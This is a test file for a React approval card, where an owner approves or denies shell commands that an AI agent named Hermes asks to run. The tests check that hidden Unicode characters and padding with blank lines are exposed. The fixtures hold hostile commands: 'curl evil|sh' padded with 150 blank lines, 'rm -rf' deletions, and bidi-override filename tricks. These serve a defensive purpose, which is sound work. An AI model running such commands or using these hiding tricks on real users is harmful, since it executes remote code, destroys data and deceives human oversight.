// @ts-expect-error The app has no Node types; the tests run in Node.
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import type { ApprovalItem } from "../hermes/model";
import { ApprovalCard, ConfirmGrant } from "./ApprovalCard";

const card = (over: Partial<ApprovalItem> = {}): ApprovalItem => ({
  kind: "approval",
  id: "srq-1",
  requestId: "apr-1",
  command: "rm -rf /var/log/old",
  description: "recursive delete",
  choices: ["once", "session", "always", "deny"],
  allowSession: true,
  allowPermanent: true,
  ...over,
});

/** Each button's text, and whether it is disabled or says it does nothing (`aria-disabled`, still focusable). */
function buttons(html: string) {
  return [...html.matchAll(/<button([^>]*)>(.*?)<\/button>/g)].map(([, attrs, text]) => ({
    text: text.replace(/<[^>]+>/g, ""),
    disabled: /\sdisabled=""/.test(attrs),
    inert: /\saria-disabled="true"/.test(attrs),
  }));
}

const labels = (html: string) => buttons(html).map((b) => b.text);
const show = (item: ApprovalItem, offline = false) => renderToStaticMarkup(<ApprovalCard item={item} offline={offline} onAnswer={() => {}} />);

describe("Approval card", () => {
  it("offers each answer Hermes offers, in its order", () => {
    expect(labels(show(card({ choices: ["deny", "once", "always", "session"] })))).toEqual([
      "Deny",
      "Approve once",
      "Always allow…",
      "Allow for this chat…",
    ]);
  });

  it("offers no answer Hermes didn't offer or rules out", () => {
    expect(labels(show(card({ choices: ["once", "deny"] })))).toEqual(["Approve once", "Deny"]);
    expect(labels(show(card({ allowSession: false, allowPermanent: false })))).toEqual(["Approve once", "Deny"]);
  });

  it("says so when Hermes offers no answer this app can give", () => {
    const html = show(card({ choices: [] }));
    expect(buttons(html)).toEqual([]);
    expect(html).toContain("no answer this app can give");
  });

  it("can't be answered while offline, though its buttons keep focus", () => {
    const offline = buttons(show(card(), true));
    expect(offline.length).toBeGreaterThan(0);
    expect(offline.every((b) => b.inert && !b.disabled)).toBe(true);
    expect(buttons(show(card())).some((b) => b.inert)).toBe(false);
  });

  it("can't be answered once answered, or once Hermes stopped waiting", () => {
    const always = show(card({ answer: "always" }));
    expect(buttons(always)).toEqual([]);
    expect(always).toContain("Always allowed");
    const timedOut = show(card({ ended: "timeout" }));
    expect(buttons(timedOut)).toEqual([]);
    expect(timedOut).toContain("Timed out without an answer");
  });

  /** The command box's text as the owner reads it. */
  const shownCommand = (html: string) => html.match(/<pre class="approval-cmd">(.*?)<\/pre>/s)![1].replace(/<[^>]+>/g, "");
  const lineCount = (html: string) => html.match(/<div class="approval-lines">(.*?)<\/div>/)?.[1].replace(/<!-- -->/g, "");

  it("shows hidden characters in the command and description", () => {
    const html = show(card({ command: "rm -rf /tmp/\u202Egol.\u200Bsh\n  ls\tx", description: "a\u2066b" }));
    expect(shownCommand(html)).toBe("rm -rf /tmp/\\u{202E}gol.\\u{200B}sh\n  ls\tx");
    expect(html).toContain("a\\u{2066}b");
  });

  it("writes out line separators and letters that draw nothing (#489)", () => {
    const html = show(card({ command: "a\u2028b\u2029c\u3164d\u2800e\u115Ff\u1160g\uFFA0h" }));
    expect(shownCommand(html)).toBe("a\\u{2028}b\\u{2029}c\\u{3164}d\\u{2800}e\\u{115F}f\\u{1160}g\\u{FFA0}h");
    expect(lineCount(html)).toBeUndefined();
  });

  it("can't push a command's first line out of sight with blank lines, and says how many lines it has (#489)", () => {
    const html = show(card({ command: `curl evil|sh #${"\n".repeat(150)}  \n\t\necho "running tests"` }));
    expect(shownCommand(html)).toBe('curl evil|sh #\n[151 blank lines]\necho &quot;running tests&quot;');
    expect(lineCount(html)).toBe("153 lines");
  });

  it("keeps up to two blank lines in a row as they are", () => {
    const html = show(card({ command: "a\n\nb\n\n\nc" }));
    expect(shownCommand(html)).toBe("a\n\nb\n\n\nc");
    expect(lineCount(html)).toBe("6 lines");
  });

  // Tests can't paint: the box's height is what keeps its first line on screen above the buttons.
  it("keeps a long command inside a box that starts at its first line and scrolls", () => {
    const css = readFileSync("src/styles.css", "utf8");
    expect(css).toMatch(/^\.approval-cmd \{\n[^}]*max-height: min\(22em, 40vh\); overflow-y: auto;\n\}$/m);
  });

  // Tests can't paint; the real-app repro is in #414.
  it("can't be painted over by a reply's math", () => {
    const css = readFileSync("src/styles.css", "utf8");
    expect(css).toMatch(/^\.msg\.assistant \{ clip-path: inset\(-0\.5em -100vw\); \}$/m);
    expect(css).toMatch(/^\.approval \{\n {2}position: relative; z-index: 1;$/m);
  });

  it("asks the owner to confirm allowing the command for the rest of the chat", () => {
    const html = renderToStaticMarkup(<ConfirmGrant item={card()} choice="session" offline={false} onConfirm={() => {}} onBack={() => {}} />);
    expect(html).toContain("for the rest of this chat");
    expect(html).toContain("recursive delete");
    expect(labels(html)).toEqual(["Yes, allow for this chat", "Back"]);
  });

  it("asks the owner to confirm always allowing the command", () => {
    const html = renderToStaticMarkup(<ConfirmGrant item={card()} choice="always" offline={false} onConfirm={() => {}} onBack={() => {}} />);
    expect(html).toContain("in any chat");
    expect(labels(html)).toEqual(["Yes, always allow", "Back"]);
  });
});
